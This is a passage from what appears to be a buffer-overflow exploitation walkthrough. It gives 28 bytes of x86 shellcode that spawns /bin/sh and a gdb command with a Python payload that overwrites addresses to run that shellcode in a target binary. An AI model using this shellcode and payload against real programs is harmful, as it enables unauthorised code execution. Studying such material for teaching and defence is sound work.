```

The instructions are correctly executed and the `SIGTRAP` is raised. </br>
To launch a shell, we will replace the first 28 bytes of the `0xCC` padding with shellcode instructions.`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`.
```
(gdb) r `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xCC"*(104-28) +"\x0c\xa0\x04\x08"'`
